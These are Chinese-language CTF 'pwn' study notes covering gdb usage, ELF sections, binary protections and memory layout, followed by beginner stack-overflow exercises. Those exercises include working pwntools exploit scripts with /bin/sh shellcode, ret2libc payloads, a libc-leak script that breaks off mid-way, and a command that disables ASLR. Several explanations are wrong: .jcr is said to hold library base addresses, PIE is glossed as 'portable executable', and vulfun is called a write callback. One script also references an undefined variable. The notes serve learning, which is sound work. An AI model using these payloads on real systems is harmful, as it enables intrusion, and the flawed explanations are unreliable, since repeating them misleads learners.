# Pwn

此笔记推荐使用Typaro查阅

## 笔记序言

笔记是我从蒸米和wiki从零学习pwn时所记录的，如果有什么问题可以二者从相同知识进度一起进行。
以后如有其他地方的pwn题笔记，大概不会将从简单的地方开始记录了，因为目前基础已经不再需要了。

续，`蒸米 & wiki`开始学习`堆(heap)`后遇到了瓶颈`(已了解堆原理)`，在`Protostar`中对堆的攻击开始有一定的认识。
同时`Protostar`的`stack`没有pwn环境，手搓机器码相对来说很有意思，不依赖库，Protostar作为pwn入门比较合适。

### 前提知识

编程语言基础、汇编语言(熟悉)、计算机操作系统(熟悉)、编译原理(了解)

### 环境需求

[kali2021.4a搭建pwn环境 - LY613313 - 博客园 (cnblogs.com)](https://www.cnblogs.com/LY613313/p/16180128.html)
[pwn基础\]PWN环境搭建 - VxerLee昵称已被使用 - 博客园 (cnblogs.com)](https://www.cnblogs.com/VxerLee/p/15424937.html)
https://libc.blukat.me/ libc地址计算(非常重要)

```bash
-i https://pypi.tuna.tsinghua.edu.cn/simple #该参数 调用清华源 下载会很快 不会超时
#将python pip都可用 pwndbg的/setup.sh下载超时报错时可以进去修改脚本
# Upgrade pip itself <==脚本中搜索该注释为下面的命令添加清华源
${PYTHON} -m pip install ${INSTALLFLAGS} --upgrade pip -i https://pypi.tuna.tsinghua.edu.cn/simple
# Install Python dependencies <==同样搜索并修改
${PYTHON} -m pip --default-timeout=60 install ${INSTALLFLAGS} -Ur requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple some-package
```

Windows 反汇编工具IDA64 / IDA32
Linux操作系统(Ubuntu / Kali)、Python(Python3中的pwn库、LibcSearcher库)
现成Pwn环境虚拟机[python2]：
账号密码： giantbranch:giantbranch
链接：https://pan.baidu.com/s/1Ia8NPcXy414QOaiH14T3sQ 提取码：kypa 
**本地搭建pwn题：socat tcp-l:[port],fork exec:./file, reuseaddr #我ubuntu上运行报错了 没有加后面的 ", reuseaddr" 可以运行**

### 做题思路	

+ 把冰箱门打开(checksec ldd 程序运行)
+ 把大象放进去(ida_pro **gdb(pwndbg)** 找到程序漏洞)
+ 把冰箱门关上(泄露libc基地址 通过基地址计算system binsh地址 布置栈帧控制执行system('/bin/sh'))

> 主函数没有get_shell怎么办？(ret2text)
> 整个程序没有system函数怎么办？(ret2libc)
> 64位程序就这么简单？(ret2csu)
> 静态编译怎么办？(ret2syscall)
> 保护不全有没有好办法？(ret2shellcode)
> 栈与非栈的格式化字符串

1.泄露(r)	2.攻击(w,x)

### 基础知识

看看就好，后面做题想起来了回来看即可，建议从初始引导开始看。

#### 栈空间经典布局

```stack
buffer|canary|saved fame pointer|saved returned address
```

#### 大小端序

大端序（Big-endian）和小端序（Little-endian）是两种不同的数据存储方式。

在大端序中，数据的高字节（即最高有效位）保存在低地址中，而数据的低字节（即最低有效位）保存在高地址中。例如，整数0x1234（十进制为4660）在大端序中的存储方式如下：

```
 +----------------+----------------+
 |      0x12      |      0x34      |
 +----------------+----------------+
 | high address   | low address    |
```

在小端序中，数据的低字节保存在低地址中，而数据的高字节保存在高地址中。例如，整数0x1234（十进制为4660）在小端序中的存储方式如下：

```
 +----------------+----------------+
 |      0x34      |      0x12      |
 +----------------+----------------+
 | high address   | low address    |
```

大端序和小端序的区别在于，它们对于整数的存储顺序是相反的。大端序是按照高位在前、低位在后的顺序存储数据，而小端序则是按照低位在前、高位在后的顺序存储数据。

**简单来说大端序是人类看数字的顺序，小端序是反过来的机器存储数据的顺序。**
**人类眼中的大端序0x12345678，在机器存储的小端序变中为\x78\x56\x34\x12。**

#### Pwn工具库

Python-pwntools:https://bbs.pediy.com/thread-247217.htm
Python-LibcSearcher:https://bbs.pediy.com/thread-247217.htm
使用方法:[[原创\][新手向] 一步一步学pwntools-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)](https://bbs.kanxue.com/thread-247217.htm)

#### gdb

插件安装：[GDB插件控制——切换pwndbg,peda,gef - 简书 (jianshu.com)](https://www.jianshu.com/p/94a71af2022a) #一般只用pwndbg

```shell
set disassembly-flavor intel #以intel汇编显示反汇编
i/info (b, r) #i b查看断点 i r查看寄存器
b/break *addr / b function() #设置断点
#i b查看断点编号后 使用
d/disable 编号 #临时使断点无效
d/delete 编号 #删除断点
start #开始 运行到gdb所根据符号表分析的程序入口处
ni #n/next info //逐行运行(不会进入函数体)并显示信息
si #s/step info //逐行运行(会进入函数体)并显示信息
finish #从当前函数执行结束并出去
c/continue #继续执行
disassemble 地址或函数 #反汇编
p/print reg/address #输出
set *((unsigned int)$ebp+0x10)=0x8 #set给指定位置更改数值
x reg/address #查看内存
#x/20i $rip //i表示以汇编代码显示 i的位置还可以换成sbgwx来写 20表示向下20行 如果不写数字默认显示一行
#s表示以字符串形式显示 b表示以1个字节显示 w表示以4个字节显示 g表示以8个字节显示 d表示以十进制显示 x表示以16进制显示 
#可以在不冲突的情况下组合写回显形式 x/20bd $rbp
vmmap #插件指令 查看内存情况
watch *addr #监控指定位置的内存 如果读写了指定内存程序会停在此处
```

#### DLL库

动态链接库（Dynamic Link Library 或者 Dynamic-link Library，缩写为 DLL）

动态链接指程序调用到某个函数的时候，才会去libc库中查找该函数并调用。好处是程序用到了函数才会去加载函数，不会加载不需要的函数，提高了速度。但是需要安装libc库，属于牺牲可移植性来换速度和轻量。Linux系统中大部分使用的是动态链接。

静态链接是在程序运行的时候把所有函数编译好集成在程序中，不需要任何libc库，虽然牺牲了空间和速度，但是可移植性非常高。Windows系统中大部分程序使用的是静态链接。

libc是一个C语言库，包含了许多常用的C语言函数。这些函数可以被程序在运行时调用，以实现各种常见的操作，例如输入/输出、字符串操作、内存管理等。当程序运行时，它会加载libc库，并使用它提供的函数来实现相应的功能。

`plt` 和 `got` 都是在运行时使用的数据结构，它们的作用是帮助程序动态链接库函数和全局变量。

got和plt表是在编译和链接c程序时自动生成的两个表。got表（全名为global offset table）储存了程序中各个外部函数的实际内存地址。plt表（全名为procedure linkage table）储存了程序中调用各个外部函数的跳转指令。当程序调用一个外部函数时，它会先跳转到plt表中对应的位置执行跳转指令，然后再跳转到got表中对应的位置获取实际的内存地址并执行函数。这样做的好处是，程序在运行时可以动态地载入和卸载外部函数库，提高了程序的灵活性。

plt是一个函数指针，在实际exp的使用中，有时候没有直接指向正确的地址中间有很多中转地址的时候，就需要对其函数指针内存进行填充以确保plt能指向正确的函数地址。而got表中的存储着函数真正存放的地址。

##### **plt和got表与libc库的关系**

- 在编译期间，如果程序使用了库函数或全局变量，那么编译器会在程序中生成对应的 `plt` 和 `got` 表。这些表在运行时会帮助程序动态链接库函数和全局变量。
- 在执行期间，程序会加载库文件（如 `libc` 库）并将其链接到进程的地址空间中。这样程序就可以使用库函数和全局变量了。在链接的过程中，程序会将库文件中的函数和变量的地址填入 `plt` 和 `got` 表中，这样程序就可以通过 `plt` 和 `got` 表来调用库函数和访问全局变量了。

因此，`plt` 和 `got` 表与库文件之间的关系是动态链接的关系。`plt` 和 `got` 表是在编译期间生成的，而库文件是在执行期间加载的。程序在运行时会使用 `plt` 和 `got` 表来动态链接库函数和全局变量，从而使用这些函数和变量

#### C程序编译

```shell
#安装gcc32位编译库
apt install gcc-multilib
#x86
gcc question_5.c -m32 -fno-stack-protector -no-pie -o question_5_x86
gcc question_5.c -m32 -fno-stack-protector -no-pie -fomit-frame-pointer -o question_5_x86_sep
#x64
gcc question_5.c -fno-stack-protector -no-pie -o question_5_x64
gcc question_5.c -fno-stack-protector -no-pie -fomit-frame-pointer -o question_5_x64_sep
```

#### 程序保护机制

checksec firename后会出现类似如下信息：

> Arch:     i386-32-little    
> RELRO:    Partial RELRO    #部分只读保护
> Stack:    No canary found    #没有金丝雀保护
> NX:       NX enabled    #开启了NX保护
> PIE:      No PIE (0x8048000)		#没有PIE保护

Arch是一种Linux系统，这里指示该程序的架构，为i386-32-little即32位小端序

RELRO是一种内存保护技术，它的作用是保护程序的全局数据段和动态链接器的表格。RELRO的名字来源于"read-only relocations"，这意味着在使用RELRO保护后，程序的全局数据段和动态链接器的表格变为只读的。
RELRO的类型有两种：部分RELRO和完整RELRO。部分RELRO只保护程序的全局数据段，而完整RELRO则还会保护动态链接器的表格。

Stack表示栈，canary意为金丝雀，英国矿井工人会放关着金丝雀的笼子进入深井测试是否有毒，在栈中会设置一个随机函数，当栈溢出覆盖了这个函数导致值被改变则触发金丝雀保护，程序终止运行。

NX（也称为不可执行位 no-execute）是一种内存保护技术，它的作用是禁止程序在受保护的内存区域中执行指令。在大多数现代操作系统中，操作系统会将内存分为可执行区域和不可执行区域，并将可执行区域用于存储程序代码，而不可执行区域则用于存储数据。使用NX保护后，程序就不能在不可执行区域中执行指令。这可以防止攻击者利用漏洞在不可执行区域中注入恶意代码，并防止攻击者执行缓冲区溢出攻击。

PIE（也称为可移植可执行文件）是一种内存保护技术，它的作用是保护程序的地址空间不被攻击者改变。在不使用PIE保护的情况下，程序的代码和数据都会被加载到内存的固定地址处，并固定在那里执行。使用PIE保护后，程序的代码和数据将会被加载到内存的随机地址处，并从那里执行。这可以防止攻击者利用漏洞确定程序的内存布局，并防止攻击者执行地址相关攻击。

开启了PIE不一定会进行保护，还需要系统开启ASLR内存地址随机化机制（address space layout randomization)，ASLR是默认开启的。
cat  /proc/sys/kernel/randomize_va_space
0 - 表示关闭进程地址空间随机化
1 - 表示将mmap的基址，stack和vdso页面随机化
2 - 表示在1的基础上增加堆（heap）的随机化
echo 0 > /proc/sys/kernel/randomize_va_space 关闭系统ASLR

#### 函数调用约定

**__cdecl：C/C++默认方式，参数从右向左入栈，主调函数负责栈平衡。** #pwn题多大都是\_\_cdecl
\_\_stdcall：windows API默认方式，参数从右向左入栈，被调函数负责栈平衡。
\_\_fastcall：快速调用方式。所谓快速，这种方式选择将参数优先从寄存器传入(ECX和EDX)，剩下的参数再从右向左从栈传入。因为栈是位于内存的区域，而寄存器位于CPU内，故存取方式快于内存，故其名曰“\_\_fastcall”。dd

#### 程序执行函数过程

```assembly
;当函数被调用时
call dofunc ; = push eip, jmp 将当前程序执行的下一条指令地址存入栈中 并跳转进函数
push ebp ;记录当前栈底的地址推入栈中
mov ebp, esp ;将栈顶地址赋值给栈底 即让从当前栈顶的位置开始作为栈低 用新的空间地址运行函数
sub esp, 0x20 ;栈顶向上移动，向低位移动两个字 即4字节32位

;当函数即将结束时
leave ; = mov esp, ebp | pop ebp 
;把ebp地址赋值给esp 即让栈顶回到未调用函数时的位置 并把最开始入栈的未调用函数时的ebp地址弹回去 复原 即函数调用结束
ret ; = pop eip ;将eip从栈中弹回 让程序运行位置从函数返回程序中
```

#### 程序在内存中的段

##### LOAD

LOAD段是在可执行文件中的一种段类型，用于存储程序的代码和数据。
在可执行文件中，LOAD段可能有多个，每个LOAD段都有自己的内存地址和大小。代码和数据将按照它们在文件中出现的顺序加载到内存中。
在程序执行时，代码将被加载到可执行内存中，而数据将被加载到数据内存中。
LOAD段在可执行文件中是一个重要的组成部分，因为它包含了程序的代码和数据，是程序能够正常执行的关键。

##### .init

.init段是在可执行文件中的一种段类型，用于存储程序的初始化代码。
在程序启动时，.init段中的代码将被执行。它可能用于初始化全局变量、执行资源初始化操作等。
.init段通常是可执行文件中的一个小段，只包含少量的代码。在程序执行过程中，它并不常用。
在程序执行过程中，.init段中的代码可能不会被再次执行。如果需要在程序执行过程中执行某些特定的初始化操作，可以在.init段之外的其他部分实现。

.init段的代码在程序启动时被加载到内存中，并在main函数之前执行。它通常用于初始化全局变量、执行资源初始化操作等。
.init段的代码在程序启动时仅执行一次，在程序执行过程中不会再次执行。如果需要在程序执行过程中执行某些特定的初始化操作，可以在.init段之外的其他部分实现。

##### .plt

.plt段（Procedure Linkage Table）是在可执行文件中的一种段类型，用于存储动态链接程序调用的相关信息。.plt段是一个用于调用动态链接库函数的代码块。

##### .text

text段是在可执行文件中的一种段类型，用于存储程序的代码。
在可执行文件中，.text段通常是最大的段，包含了程序的所有代码。它存储了程序中所有函数的代码，以及全局变量的定义。
.text段在程序执行过程中是非常重要的，因为它包含了程序的所有代码。在程序启动时，.text段中的代码将被加载到可执行内存中，并在程序执行过程中被调用。
总的来说，.text段是可执行文件中的一个重要段，用于存储程序的代码。它在程序执行过程中起着至关重要的作用。

##### .rodata

.rodata段是只读数据段，也称为常量区或者常量数据段。它用于存储程序的常量数据，通常包括字符串常量和静态初始化的全局变量。
在程序运行时，.rodata段的数据不能被修改，只能被读取。因为.rodata段的数据不能被修改，所以它可以被放在只读存储器（如ROM）中，以此来提高程序的安全性。
程序的每一个段都有一个用于标识它的名称，在各种操作系统和编译器中，.rodata段的名称可能不同。例如，在Windows中，.rodata段也被称为"_rdata"段，在Linux中，它被称为"rodata"段。

```c
#include <stdio.h>
const char* str = "Hello, World!";  // 常量字符串
int main()
{
  printf("%s\n", str);
  return 0;
}
```

在编译这个程序后，"Hello, World!"这个字符串常量就会被放入.rodata段中。

##### .eh_frame_hdr

.eh_frame_hdr段是一种特殊的段，它用于存储异常处理信息。
在程序中，异常处理是指当程序运行时发生的不正常事件，如缺少必要的输入数据、访问无效的内存地址等。这些异常事件会导致程序停止执行，并可能导致程序崩溃。
为了避免这种情况，我们可以在程序中使用异常处理机制，在程序运行时检测到异常事件时，调用特定的处理函数，以便在发生异常时保护程序的正常运行。
.eh_frame_hdr段用于存储异常处理信息，包括异常处理函数的地址和调用信息。这些信息在程序运行时被用来捕获异常，并调用相应的处理函数。
.eh_frame_hdr段通常在程序的可执行文件中出现，在不同的操作系统和编译器中，.eh_frame_hdr段的名称可能有所不同。

##### .init_array

.init_array段是一种特殊的段，它用于存储程序的初始化函数。
在程序中，初始化函数是指在程序启动时被调用的函数，用于执行一些必要的初始化操作。例如，在C++语言中，可以使用全局对象的构造函数来实现初始化函数的功能。
.init_array段用于存储程序的初始化函数，包括初始化函数的地址和调用信息。这些信息在程序启动时被用来调用初始化函数。
.init_array段通常出现在程序的可执行文件中，在不同的操作系统和编译器中，.init_array段的名称可能有所不同。

##### .fini_array

.fini_array段是一种特殊的段，它用于存储程序的终止函数。
在程序中，终止函数是指在程序结束时被调用的函数，用于执行一些必要的清理操作。例如，在C++语言中，可以使用全局对象的析构函数来实现终止函数的功能。
.fini_array段用于存储程序的终止函数，包括终止函数的地址和调用信息。这些信息在程序结束时被用来调用终止函数。
.fini_array段通常出现在程序的可执行文件中，在不同的操作系统和编译器中，.fini_array段的名称可能有所不同。

例如，下面是一个C++程序：

```c++
#include <iostream>
class MyClass
{
public:
  MyClass()
  {
    std::cout << "MyClass constructor called." << std::endl;
  }
  ~MyClass()
  {
    std::cout << "MyClass destructor called." << std::endl;
  }
};
MyClass obj;  // 全局对象
int main()
{
  return 0;
}
```

在编译这个程序后，MyClass的析构函数就会被放入.fini_array段中。

##### .jcr

.jcr段是一种特殊的段，它用于存储程序的动态库的基地址寄存器的值。
在程序中，动态库是指可以在程序运行时加载的库文件，通常使用动态链接库（Dynamic Link Library，DLL）的形式出现。动态库中包含了程序运行时需要调用的函数和数据，可以提供给多个程序使用。
动态库通常被加载到进程的地址空间中，在加载时，系统会为每个动态库分配一个基地址。基地址是动态库在进程地址空间中的起始地址，它决定了动态库中所有的函数和数据的实际地址。
.jcr段用于存储程序的动态库的基地址寄存器的值，这些值在程序运行时被用来访问动态库中的函数和数据。
.jcr段通常出现在程序的可执行文件中，在不同的操作系统和编译器中，.jcr段的名称可能有所不同。

##### .got

.got段是一种特殊的段，它用于存储全局偏移量表（Global Offset Table，GOT）。
在程序中，GOT是一种动态的数据结构，用于存储程序中使用的全局变量和函数的地址。GOT的作用是在程序运行时将全局变量和函数的地址和符号名称关联起来。
.got段用于存储GOT，它包括全局变量和函数的地址信息。在程序运行时，GOT会被加载到内存中，并被用来解析程序中使用的全局变量和函数的地址。
.got段通常出现在程序的可执行文件中，在不同的操作系统和编译器中，.got段的段的名称可能有所不同。

举个例子，假设有一个程序中有一个全局变量`x`和一个函数`foo`，在编译后，这个程序的可执行文件中会出现一个.got段，其中包含了`x`和`foo`的地址信息。在程序运行时，GOT会被加载到内存中，并被用来解析程序中使用的全局变量和函数的地址。

```c
#include <stdio.h>
int x = 100;
void foo()
{
  printf("foo called.\n");
}
int main()
{
  printf("x = %d\n", x);
  foo();
  return 0;
}
```

在编译这个程序后，`x`和`foo`的地址信息就会被存储在.got段中。在程序运行时，GOT会被加载到内存中，并被用来解析程序中使用的全局变量和函数的地址。

##### .got.plt

.got.plt段是一种特殊的段，它用于存储全局偏移量表的程序链接表（Procedure Linkage Table，PLT）。
在程序中，PLT是一种动态的数据结构，用于存储程序调用动态链接库（Dynamic Link Library，DLL）中的函数的信息。PLT的作用是在程序运行时将程序调用的函数和动态链接库中的函数关联起来。
.got.plt段用于存储PLT，它包括程序调用的函数的地址信息和调用信息。在程序运行时，PLT会被加载到内存中，并被用来解析程序调用的函数的地址。
总结一下，.got.plt段是一个存储外部符号地址的表。

##### .data

.data段是一个数据段，用于存储在程序运行期间可更改的全局或静态变量的值。它包含了在程序中定义的所有静态存储期（static storage duration）的变量，以及使用 `extern` 关键字声明的外部变量。在程序运行时，.data段中的变量可以被读取和修改。
例如，如果你在程序中定义了一个静态变量，如下所示：

```java
static int x = 10;
```

那么这个变量 `x` 的值就会被存储在 `.data` 段中。
总结一下，.data段是一个数据段，用于存储在程序运行期间可更改的全局或静态变量的值。

##### .bss

.bss用于存储在程序运行期间可更改的全局或静态变量的值。它与 `.data` 段类似，但是它存储的是未初始化的全局变量。也就是说，在程序运行期间，`.bss` 段中的变量可以被读取和修改，但是它们在编译时并没有被赋值。
例如，如果你在程序中定义了一个未初始化的静态变量，如下所示：

```java
static int x;
```

那么这个变量 `x` 的值就会被存储在 `.bss` 段中。
总结一下，`.bss` 段是一个段，用于存储在程序运行期间可更改的全局或静态变量的值，但是这些变量在编译时并没有被赋值。

##### .prgend

`.prgend` 段是一个非标准的段名称，并不是所有编译器都支持。它通常用于标识程序的末尾，或者程序代码结束后的其他数据。
在某些编译器中，`.prgend` 段可能会用于标识程序结束的位置，以便在运行时执行某些特殊操作。例如，可能会在程序结束时输出某些信息或执行清理工作。
然而，`.prgend` 段并不是所有编译器都支持的标准段名称。因此，如果你使用的编译器不支持 `.prgend` 段，那么你的程序可能会无法正常编译或链接。
总结一下，`.prgend` 段是一个非标准的段名称，它通常用于标识程序的末尾，或者程序代码结束后的其他数据。它并不是所有编译器都支持的标准段名称。

##### extern

`extern` 是 C/C++ 中的一个关键字，它用于声明外部变量或函数。它的语法如下：

```c
extern type variable;
extern type function(parameters);
```

`extern` 关键字用于声明一个外部变量或函数，它告诉编译器这个变量或函数在另一个文件中定义。这意味着，如果你在程序中使用了 `extern` 关键字声明的变量或函数，那么编译器在编译期间并不会去检查这个变量或函数的定义。它只是假设这个变量或函数在另一个文件中已经被定义了。
例如，如果你有两个文件 `foo.c` 和 `bar.c`，其中 `foo.c` 中有一个函数 `int add(int x, int y)`，而 `bar.c` 中想要使用这个函数，那么你可以在 `bar.c` 中使用 `extern` 关键字来声明这个函数，如下所示：

```c
extern int add(int x, int y);
```

这样，编译器就会在编译 `bar.c` 文件时假设 `add` 函数已经在另一个文件中被定义了。
总结一下，`extern` 是 C/C++ 中的一个关键字，用于声明外部变量或函数。它告诉编译器这个变量或函数在另一个文件中定义，编译器在编译期间并不会检查这个变量或函数。

#### 程序在内存中的布局

![](./Pwn/memoryLayoutC.jpg)

**Text Segment** 
文本段，也称为代码段或简称为文本，是目标文件或内存中程序的一部分，其中包含可执行指令。
作为内存区域，文本段可以放置在堆或堆栈下方，以防止堆和堆栈溢出覆盖它。
通常，文本段是可共享的，因此对于经常执行的程序（如文本编辑器、C 编译器、shell 等），内存中只需要一个副本。此外，文本段通常是只读的，以防止程序意外修改其指令。
**Initialized Data Segment** 
初始化的数据段，通常简称为数据段。数据段是程序虚拟地址空间的一部分，其中包含由程序员初始化的全局变量和静态变量。
请注意，数据段不是只读的，因为变量的值可以在运行时更改。
该段可以进一步分为初始化的只读区域和初始化的读写区域。
例如，在 C 中由 char s[] = “hello world” 定义的全局字符串和 main （即全局）之外的 c 语句（如 int debug=1）将存储在初始化的读写区域中。像 const char* string = “hello world” 这样的全局 C 语句使字符串文字 “hello world” 存储在初始化的只读区域中，字符指针变量字符串存储在初始化的读写区域中。
例如：静态 int i = 10 将存储在数据段中，全局 int i = 10 也将存储在数据段中
**Uninitialized Data Segment** 
**未初始化的数据段通常**称为“**BSS**”段，以旧汇编运算符命名，代表“**由符号启动的块**”。此段中的数据由内核初始化为算术 0，然后程序开始执行未初始化的数据从数据段的末尾开始，并包含初始化为零或在源代码中没有显式初始化的所有全局变量和静态变量。
例如，一个声明为静态 int i 的变量;将包含在BSS部分。
例如，声明 int j 的全局变量;将包含在BSS部分。
**Stack** 
栈区域传统上与堆区域相邻，并向相反方向增长;当栈指针遇到堆指针时，可用内存已耗尽。（使用现代大地址空间和虚拟内存技术，它们几乎可以放置在任何地方，但它们通常仍然以相反的方向增长。
栈区域包含程序堆栈，这是一种LIFO (Last in Final out先进后出 类似弹夹) 结构，通常位于内存的较高部分。在标准 PC x86 计算机架构上，它向地址零增长;在其他一些体系结构上，它以相反的方向增长。“栈指针”寄存器跟踪栈的顶部;每次将值“推送”到栈上时，都会对其进行调整。为一个函数调用推送的值集称为“栈帧”;栈帧至少包含一个返回地址。
栈，用于存储自动变量，以及每次调用函数时保存的信息。每次调用函数时，返回到何处的地址以及有关调用方环境的某些信息（例如某些计算机寄存器）都会保存在栈中。然后，新调用的函数在堆栈上为其自动变量分配空间。这就是 C 中的递归函数的工作方式。每次递归函数调用自身时，都会使用一个新的栈帧，因此一组变量不会干扰来自函数另一个实例的变量。
**Heap** 
**堆**是通常进行动态内存分配的段。
堆区域从 BSS 段的末尾开始，并从那里增长到更大的地址。堆区域由 malloc、realloc 和 free 管理，它们可以使用 brk 和 sbrk 系统调用来调整其大小（请注意，使用 brk/sbrk 和单个“堆区域”不需要履行 malloc/realloc/free 的契约;它们也可以使用 mmap 实现，将虚拟内存的潜在不连续区域保留到进程的虚拟地址空间中）。堆区域由进程中的所有共享库和动态加载的模块共享。

### 初始引导

```c
#include <stdio.h>
int main()
{
    printf("Hello World!");
    return 0;
}
```

```bash
gcc 1.c -o 1 -save-temps --verbose #-o表示输出文件 1.c编译输出为可执行二进制文件1 -save-temps保存编译过程中的缓存 -verbose输出工作流程(冗长模式)
```

执行后可以看见 1、1.c、1.i、1.o、1.s 五个文件 1为二进制可执行文件 1.c为源代码文件 1.i为预处理文件 1.o为编译后的二进制文件 1.s为汇编代码
程序编译过程：1.c(源代码) ==预处理==> 1.i(整理头文件到一起) ==编译为汇编==> 1.s(汇编代码) ==编译为二进制==> 1.o(二进制文件) ==链接==> 1(可执行文件)

什么是可执行文件？

> + 广义：文件中的数据是可执行代码的文件 —— .out、.exe、.sh、.py
> + 狭义：文件中的数据是机器码的文件 —— .out、.exe、.dll、.so

可执行的文件的分类

Windows：PE(Portable Executable)

> + 可执行程序 .exe
> + 动态链接库 .dll
> + 静态链接库 .lib

Linux：ELF(Executable and Linkable Format)

> + 可执行程序 .out
> + 动态链接库 .so
> + 静态链接库 .a

```shell
readelf -a ./1 #读取二进制可执行文件1的所有信息(-a参数)
```

Linux下的可执行文件ELF

ELF文件头表(ELF Header)

+ 记录了ELF文件的组织结构

程序头表/段表(Program header table)

+ 告诉系统如何创建进程
+ 生成进程的可执行文件必须拥有此结构
+ 重定位文件不一定重要

节头表(Section header table)

+ 记录了ELF文件的节区信息
+ 用于链表的目标文件必须拥有此结构
+ 其他类型目标文件不一定需要

![image-20230320093908607](./Pwn/Example01.png)

![image-20230320094049975](./Pwn/Example02.png)

```bash
┌──(root㉿sxylao1)-[/proc/1] #该路径下的map可以看见进程每个段的权限
└─# cat maps  
557d06e95000-557d06e9b000 r--p 00000000 08:01 419287                     /usr/lib/systemd/systemd
557d06e9b000-557d06ea5000 r-xp 00006000 08:01 419287                     /usr/lib/systemd/systemd
```

```bash
ulimit -a #显示程序各个部分的分配大小
```

```c
//1.c
int dlb;
char* str = "Hello World";
int sum(int x, int y)
{
        int t = x + y;
        return t;
}
int main()
{
        sum(1, 2);
        void* ptr = malloc(0x100);
        read(0, ptr, 0x100); //input "deadbeef" 读取堆上0x100个信息
        return 0;
}
```

```bash
gcc 1.c -o 1
```

[Ring0和Ring3权限级](https://blog.51cto.com/broadviewsec/125263)
Intel的x86处理器是通过Ring级别来进行访问控制的，级别共分4层，从Ring0到Ring3（后面简称R0、R1、R2、R3）。R0层拥有最高的权限，R3层拥有最低的权限。按照Intel原有的构想，应用程序工作在R3层，只能访问R3层的数据；操作系统工作在R0层，可以访问所有层的数据；而其他驱动程序位于R1、R2层，每一层只能访问本层以及权限更低层的数据。
这应该是很好的设计，这样操作系统工作在最核心层，没有其他代码可以修改它；其他驱动程序工作在R1、R2层，有要求则向R0层调用，这样可以有效保障操作系统的安全性。但现在的OS，包括Windows和Linux都没有采用4层权限，而只是使用2层——R0层和R3层，分别来存放操作系统数据和应用程序数据，从而导致一旦驱动加载了，就运行在R0层，就拥有了和操作系统同样的权限，可以做任何事情，而所谓的rootkit也就随之而生了。

![image-20230320135619118](./Pwn/Example03.png)

usermod为ring3权限，当通过execve执行时就会进入到kernel mode的ring

## 蒸米Pwn

[二进制安全 (yuque.com)](https://www.yuque.com/hxfqg9/bin)
[yichen小菜鸡的个人空间_哔哩哔哩_bilibili](https://space.bilibili.com/24337218)

### Stack Overflow

#### Basic ROP

##### x86

**笔记中的exp做了汉语注释拿来直接用可能会报错 需要删掉注释**

###### level1

pattern.py：https://pan.baidu.com/s/1mH8UiyySwE8cJdl0Z11NHQ
pattern可以生成特定规律不重复的字符串，根据溢出报错的返回地址来计算输入空间的大小

python pattern.py create 150 #产生150个字符 安装pattern后也可以用cyclic 150
gdb level1后run 再将生成的150个字符填入进去，得到覆盖掉的返回地址
python pattern.py offset 0x37654136 #计算栈空间输入的大小 也可以cyclic -l 0x37654136

```python
from pwn import *
p = process('./level1') #process('./连接本地文件') p只是随便起的变量名 叫啥都行
ret = 0xffffcee0 #ida中shitr+F12后找到/bin/sh 双金点进去 接着点溯源到真正的binsh 复制地址
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80" #一个shellcode的机器码 了解即可 
payload = shellcode + 'A' * (140 - len(shellcode)) + p32(ret) 
#加了一个shell又减去了一个shell的长度等于没加 说白了就是把栈空间输入的那段空间填满直到返回地址 让新的返回地址覆盖
#p32()把地址打包为32位的机器码 'A'为一个字节 也可以写上单位 b'A' 计算出来输入的栈空间为140所以b'a'*140
#p64() ==> 0xe0 0xce 0xff 0xff 0x00 0x00 0x00 0x00
#p32() ==> 0xe0 0xce 0xff 0xff
p.send(payload) #发送payload
p.interactive() #激活
```

```python
from pwn import * #一样的 简化一下
p = process('./level1')
ret = 0xffffcee0
payload = flat([b'a'*140, binsh])  
#flat([])函数把里面的参数全部打包成一个字节串(机器码)
#不使用flat函数可以写为payload = b'a'*140 + p32(binsh)
#上面的p32(ret)因为有p32() 所以已经打包过了就不用flat
p.sendline(payload)
p.interactive()
```

###### level2

ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置，一般情况下，我们会选择执行 system("/bin/sh")。 #system()函数可以执行系统的命令 比如system("ls")会列出目录
system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。
即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。

无PIE ASLR保护

```python
from pwn import *
p = process('./level2')
ret = 0xffd76390
systemaddr=0xf7e41940
binshaddr=0xf7f6002b
payload =  'A'*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)
#调用system函数需要三个参数：system函数本身的地址、一个返回地址，和要执行的命令的地址。
#因此，在payload中，p32(ret)是作为system函数的第二个参数，用来指定函数调用完成后应该返回的地址。
#这个地址通常被称为“返回地址”，因为它指示了函数调用完成后程序应该执行的下一条指令的地址。
#返回地址写啥都行，拿到shell之后就无所谓了 注:plt的函数需要有一个函数执行完后的返回地址
p.send(payload)
p.interactive()
```

有PIE ASLR保护

write函数的原型 write(1, address, len) 1表示标准输出流，address是write函数要输出的地址，而len表示输出长度

```python
#思路：通过利用一个程序中的漏洞来获取这个程序的libc库信息，并利用libc库中的system函数来执行/bin/sh命令。
from pwn import *
from LibcSearcher import *
elf=ELF('level2') #ELF()解析库文件信息 包括程序的可执行代码段、数据段、符号表和重定位表等。
p=process('./level2') #指定本地程序入口
write_plt=elf.plt['write'] #获取write函数plt地址
write_got=elf.got['write'] #获取write函数got地址
vulfun_addr = 0x08048404 
gdb.attach(p)
#调试命令，用来将调试器附加到程序上。这句话的作用是让调试器控制程序的运行，方便开发者观察程序的执行流程。
payload1='A'*140+p32(write_plt)+p32(vulfun_addr)+p32(1)+p32(write_got)+p32(4)
#'A'*140是用来占位的，它会在内存中填充140个字节。
#然后，p32(write_plt)是write函数的plt地址，它用来告诉程序调用write函数。
#接下来，p32(vulfun_addr)是一个指针，它指向vulfun函数的地址。这个函数会在write函数调用完成后执行。
#vulfun函数是一个空壳函数，它是write函数的回调函数，用于处理write函数的返回值，返回write函数的地址
#接下来，p32(1)和p32(write_got)分别表示write函数的文件描述符和写入数据的地址
#最后，p32(4)表示写入数据的字节数。
#当这段代码执行时，会先将140个字节的'A'填充到内存中，然后将write函数的plt地址和vulfun函数的地址压入栈中，接着是write函数的文件描述符、写入数据的地址和写入数据的字节数。最后，程序会调用write函数，把这些数据写入到内存中，然后执行vulfun函数。
